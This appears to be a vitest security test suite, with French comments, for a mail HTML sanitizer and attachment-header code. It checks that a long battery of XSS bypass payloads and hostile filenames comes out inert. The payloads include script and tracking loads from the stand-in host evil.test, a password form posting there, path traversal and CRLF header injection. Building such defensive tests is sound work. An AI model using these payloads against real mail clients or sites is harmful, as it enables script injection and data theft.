/**
 * AUDIT DE SÉCURITÉ — contenu hostile des mails (modules/mail/sanitize.ts) et pièces jointes.
 * Batterie de charges de contournement : toutes doivent ressortir inertes.
 */
import { describe, expect, it } from 'vitest';
import { attachmentDisposition, sanitizeFilename, sanitizeMailHtml } from '../src/modules/mail/sanitize.js';

const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(16)]);
const SVG = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(1)</script></svg>');
const HTML = Buffer.from('<html><script>alert(1)</script></html>');

const PAYLOADS: string[] = [
  '<script>alert(1)</script>',
  '<ScRiPt src=//evil.test/x.js></sCrIpT>',
  '<img src=x onerror=alert(1)>',
  '<img src="x" OnErRoR="alert(1)">',
  '<img/src="x"/onerror=alert(1)>',
  '<img src=`x`onerror=alert(1)>',
  '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
  '<img src="data:text/html,<script>alert(1)</script>">',
  '<img src="cid:svg">',
  '<img src="cid:html">',
  '<img src="cid:png" onload="alert(1)" srcset="https://evil.test/a.png 1x">',
  '<img src="https://evil.test/pixel.gif">',
  '<img src="//evil.test/pixel.gif">',
  '<img src="\\\\evil.test\\share\\x.png">',
  '<img srcset="https://evil.test/a.png 2x">',
  '<picture><source srcset="https://evil.test/a.png"><img src="cid:png"></picture>',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href="java\tscript:alert(1)">x</a>',
  '<a href="java&#x09;script:alert(1)">x</a>',
  '<a href="java&#10;script:alert(1)">x</a>',
  '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>',
  '<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A;alert(1)">x</a>',
  '<a href=" javascript:alert(1)">x</a>',
  '<a href="\u0001javascript:alert(1)">x</a>',
  '<a href="\u200bjavascript:alert(1)">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<a href="//evil.test/">x</a>',
  '<a href="/api/auth/logout">x</a>',
  '<a href="https://ok.test/" target="_top" rel="opener">x</a>',
  '<a href="https://ok.test/" onclick="alert(1)" onmouseover=alert(1)>x</a>',
  '<a href="http://ok.test/\'"onmouseover="alert(1)">x</a>',
  '<a href="mailto:a@b.test?subject=x&body=y">x</a>',
  '<a href="https://ok.test/" style="position:fixed;top:0;left:0;width:100%;height:100%">x</a>',
  '<a xlink:href="javascript:alert(1)">x</a>',
  '<form action="https://evil.test/"><input name=password><button formaction="javascript:alert(1)">ok</button></form>',
  '<input type=image src=x onerror=alert(1)>',
  '<button formaction="javascript:alert(1)">x</button>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="javascript:alert(1)"></object>',
  '<embed src="javascript:alert(1)">',
  '<base href="https://evil.test/">',
  '<link rel=stylesheet href="https://evil.test/x.css">',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<style>@import url(https://evil.test/x.css);body{background:url(https://evil.test/)}</style>',
  '<style><!--</style><img src=x onerror=alert(1)>--></style>',
  '<div style="background:url(https://evil.test/track)">x</div>',
  '<div style="background-image:url(\'https://evil.test/track\')">x</div>',
  '<div style="background:u\\72l(https://evil.test/)">x</div>',
  '<div style="width:expression(alert(1))">x</div>',
  '<div style="color:red;position:fixed;top:0;left:0;z-index:99999">x</div>',
  '<div style="font-family:\'a\';background:url(https://evil.test/)">x</div>',
  '<div style="font-family:a&quot; onmouseover=&quot;alert(1)">x</div>',
  '<div style="color:red;/*</style><script>alert(1)</script>*/">x</div>',
  '<div style="behavior:url(x.htc);-moz-binding:url(x.xml#x)">x</div>',
  '<div style="color: var(--x); content: attr(title)">x</div>',
  '<div style="border: 1px solid red; b\\61 ckground: url(//evil.test)">x</div>',
  '<table background="https://evil.test/bg.png"><tr><td background="javascript:alert(1)">x</td></tr></table>',
  '<body onload=alert(1) background="https://evil.test/x.png">x</body>',
  '<svg onload=alert(1)><script>alert(1)</script></svg>',
  '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
  '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><script>alert(1)</script></svg>#x"/></svg>',
  '<svg><style><img src=x onerror=alert(1)></style></svg>',
  '<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>',
  '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
  '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
  '<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>',
  '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<noscript><img src=x onerror=alert(1)></noscript>',
  '<template><script>alert(1)</script><img src=x onerror=alert(1)></template>',
  '<textarea></textarea><img src=x onerror=alert(1)>',
  '<textarea><img src=x onerror=alert(1)></textarea>',
  '<title><img src=x onerror=alert(1)></title>',
  '<xmp><img src=x onerror=alert(1)></xmp>',
  '<plaintext><img src=x onerror=alert(1)>',
  '<listing><img src=x onerror=alert(1)></listing>',
  '<noembed><img src=x onerror=alert(1)></noembed>',
  '<noframes><img src=x onerror=alert(1)></noframes>',
  '<select><option><img src=x onerror=alert(1)></option></select>',
  '<!--[if gte IE 4]><script>alert(1)</script><![endif]-->',
  '<!--><img src=x onerror=alert(1)>-->',
  '<!-- --!><img src=x onerror=alert(1)>',
  '<![CDATA[<img src=x onerror=alert(1)>]]>',
  '<?xml version="1.0"?><?xml-stylesheet href="javascript:alert(1)"?><img src=x onerror=alert(1)>',
  '<p title="</p><img src=x onerror=alert(1)>">x</p>',
  '<p title="&quot;&gt;&lt;img src=x onerror=alert(1)&gt;">x</p>',
  '<p title=\'"><script>alert(1)</script>\'>x</p>',
  '<p dir="ltr\\" onmouseover=\\"alert(1)">x</p>',
  '<p lang=\'x" onmouseover="alert(1)\'>x</p>',
  '&lt;script&gt;alert(1)&lt;/script&gt;',
  '&#60;img src=x onerror=alert(1)&#62;',
  '<<script>script>alert(1)<</script>/script>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<img src=x one<script>rror=alert(1)>',
  '<a href="https://ok.test/"><img src="cid:png" style="position:absolute;width:9999px;height:9999px"></a>',
  '<video src=x onerror=alert(1)><source src=x onerror=alert(1)></video>',
  '<audio src=x onerror=alert(1)></audio>',
  '<details open ontoggle=alert(1)>x</details>',
  '<marquee onstart=alert(1)>x</marquee>',
  '<isindex action="javascript:alert(1)" type=image>',
  '<keygen autofocus onfocus=alert(1)>',
  '<div contenteditable onfocus=alert(1) autofocus tabindex=1 id=x class=y data-x=y slot=z is=x>x</div>',
  '<a id="location" name="cookie" href="https://ok.test/">dom clobbering</a><form id=document name=body></form>',
  '<font color="red" face="x&quot; onmouseover=&quot;alert(1)" size="7">x</font>',
  '<td bgcolor="red\\" onmouseover=\\"alert(1)" width="100%&quot; onmouseover=&quot;alert(1)">x</td>',
  '<table><caption><svg><title><table><caption></caption></table><img src=x onerror=alert(1)></title></svg></caption></table>',
  '<pre>\n<img src=x onerror=alert(1)></pre>',
  '<div><p></div><script>alert(1)</script>',
  '\u0000<scr\u0000ipt>alert(1)</scr\u0000ipt>',
  '<img src="cid:png" alt="&quot; onerror=&quot;alert(1)" title="\'><script>alert(1)</script>">',
  '<IMG SRC="jav&#x0D;ascript:alert(1);">',
  '<a href="https://ok.test/"\u0000onclick=alert(1)>x</a>',
  '<a href="https:evil.test">x</a>',
  '<a href="http:/\\evil.test">x</a>',
  '<a href="feed:javascript:alert(1)">x</a>',
  '<a href="mailto:a@b.test\r\nBcc: c@d.test">x</a>',
];

const INLINE = new Map<string, Buffer>([
  ['png', PNG],
  ['svg', SVG],
  ['html', HTML],
]);

/** Attributs qu'une balise assainie peut porter. Tout autre nom (on*, srcset, formaction, id, class…) est une violation. */
const ALLOWED_ATTRIBUTES = new Set([
  'style', 'title', 'dir', 'lang', 'align', 'href', 'target', 'rel', 'src', 'alt', 'width', 'height', 'data-remote-blocked', 'color', 'size', 'face',
  'border', 'cellpadding', 'cellspacing', 'bgcolor', 'colspan', 'rowspan', 'valign', 'span', 'start', 'type',
]);
const ALLOWED_TAG = /^(a|abbr|b|blockquote|br|caption|center|code|col|colgroup|dd|del|div|dl|dt|em|font|h[1-6]|hr|i|img|ins|li|ol|p|pre|q|s|small|span|strike|strong|sub|sup|table|tbody|td|tfoot|th|thead|tr|u|ul)$/;

/**
 * Analyse stricte de la sortie : elle doit être une suite de texte échappé et de balises de la forme
 * <nom attr="valeur échappée" …> ; toute autre forme est signalée. Retourne ce qui ne doit JAMAIS subsister.
 */
function violations(output: string): string[] {
  const found: string[] = [];
  const tagPattern = /<(\/?)([a-zA-Z][a-zA-Z0-9]*)((?:\s+[a-zA-Z][a-zA-Z0-9:-]*(?:="[^"<>]*")?)*)\s*\/?>/g;
  // Hors des balises reconnues, il ne doit rester aucun chevron ouvrant (tout texte est échappé).
  const rest = output.replace(tagPattern, '');
  if (rest.includes('<')) found.push(`chevron hors balise reconnue : ${rest.slice(Math.max(0, rest.indexOf('<') - 20), rest.indexOf('<') + 60)}`);

  for (const match of output.matchAll(tagPattern)) {
    const [tag, closing, rawName, rawAttributes] = match as unknown as [string, string, string, string];
    const name = rawName.toLowerCase();
    if (!ALLOWED_TAG.test(name)) found.push(`balise ${name}`);
    if (closing) continue;
    const attributes = new Map<string, string>();
    for (const attr of rawAttributes.matchAll(/\s+([a-zA-Z][a-zA-Z0-9:-]*)(?:="([^"<>]*)")?/g)) attributes.set(attr[1]!.toLowerCase(), attr[2] ?? '');
    for (const [attr, value] of attributes) {
      if (!ALLOWED_ATTRIBUTES.has(attr)) found.push(`attribut interdit « ${attr} » : ${tag}`);
      if ((attr === 'href' || attr === 'src') && name !== 'a' && name !== 'img') found.push(`${attr} sur <${name}>`);
      if (attr === 'style' && /url|expression|@import|behavior|binding|position|var\s*\(|attr\s*\(|\\|&#/i.test(value)) found.push(`style actif : ${tag}`);
      if (attr === 'src' && !/^data:image\/(png|jpeg|gif|webp);base64,[A-Za-z0-9+/=]+$/.test(value)) found.push(`source d'image : ${tag}`);
      if (attr === 'href') {
        const decoded = value.replace(/&amp;/g, '&');
        // eslint-disable-next-line no-control-regex
        if (!/^(https?:\/\/[^\s/\\]|mailto:[^\s])/i.test(decoded) || /[\x00-\x20]/.test(decoded)) found.push(`lien : ${tag}`);
        if (attributes.get('target') !== '_blank' || attributes.get('rel') !== 'noopener noreferrer nofollow') found.push(`lien sans target/rel imposés : ${tag}`);
      }
    }
  }
  return found;
}

describe('vérifié — assainissement HTML des mails : batterie de contournements', () => {
  it('le détecteur de ce fichier reconnaît bien un contenu actif (contrôle du test lui-même)', () => {
    for (const bad of [
      '<img src=x onerror=alert(1)>',
      '<img src="x" onerror="alert(1)" />',
      '<script>alert(1)</script>',
      '<a href="javascript:alert(1)" target="_blank" rel="noopener noreferrer nofollow">x</a>',
      '<a href="https://ok.test/">x</a>',
      '<div style="background:url(https://evil.test/)">x</div>',
      '<img src="https://evil.test/x.png" />',
      '<p id="x">x</p>',
      '<svg onload="alert(1)"></svg>',
    ]) {
      expect(violations(bad), bad).not.toEqual([]);
    }
    expect(violations('<p title="&lt;img src=x onerror=alert(1)&gt;">a &lt;b&gt; c</p><br />')).toEqual([]);
  });

  it.each(PAYLOADS.map((payload, index) => [index, payload] as const))('charge n° %i reste inerte', (_index, payload) => {
    const { html } = sanitizeMailHtml(payload, INLINE);
    expect(violations(html), `sortie : ${html}`).toEqual([]);
    // Idempotence : repasser la sortie dans l'assainisseur (double décodage d'entités, mXSS) ne réveille rien.
    const again = sanitizeMailHtml(html, INLINE).html;
    expect(violations(again), `seconde passe : ${again}`).toEqual([]);
  });

  it('charges imbriquées dans un document complet, avec bruit autour', () => {
    const document = `<html><head><title>t</title></head><body><div>${PAYLOADS.join('</div>\n<div>')}</div></body></html>`;
    const { html } = sanitizeMailHtml(document, INLINE);
    expect(violations(html)).toEqual([]);
  });

  it('une pièce « cid: » SVG ou HTML n’est jamais intégrée, quel que soit son type déclaré', () => {
    expect(sanitizeMailHtml('<img src="cid:svg"><img src="cid:html"><img src="cid:%73vg">', INLINE).html).not.toContain('src=');
    expect(sanitizeMailHtml('<img src="cid:png">', INLINE).html).toContain('src="data:image/png;base64,');
  });

  it('imbrication profonde et entrée volumineuse : pas de plantage ni de temps démesuré', () => {
    const deep = '<div>'.repeat(20_000) + 'x' + '</div>'.repeat(20_000);
    const started = performance.now();
    expect(() => sanitizeMailHtml(deep)).not.toThrow();
    expect(() => sanitizeMailHtml('<a href="'.repeat(50_000))).not.toThrow();
    expect(() => sanitizeMailHtml(`<div style="${'color:red;'.repeat(50_000)}">x</div>`)).not.toThrow();
    expect(() => sanitizeMailHtml(`<div style="color:rgb(${'1 '.repeat(50_000)}">x</div>`)).not.toThrow();
    expect(performance.now() - started).toBeLessThan(15_000);
  });
});

describe('vérifié — noms de pièces jointes et Content-Disposition', () => {
  it.each([
    '../../../../etc/passwd',
    '..\\..\\windows\\system32\\drivers\\etc\\hosts',
    'facture.pdf\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>',
    'a"; filename="evil.html',
    'a\u202Efdp.exe',
    'x.html\u0000.png',
    '%0d%0aSet-Cookie:%20a=b',
    "'; filename*=UTF-8''evil.html",
    'CON.txt',
    '.htaccess',
    '\ud83d\udca9.pdf',
    '\ud800',
  ])('nom hostile %j → en-tête sur une ligne, toujours « attachment »', (name) => {
    const header = attachmentDisposition(name);
    // eslint-disable-next-line no-control-regex
    expect(header).not.toMatch(/[\r\n\u0000]/);
    expect(header).toMatch(/^attachment; filename="[^"\\\r\n]*"; filename\*=UTF-8''[A-Za-z0-9%._~!$&+^`|{}-]*$/);
    const safe = sanitizeFilename(name);
    expect(safe).not.toMatch(/[/\\]/);
    expect(safe.startsWith('.')).toBe(false);
  });
});
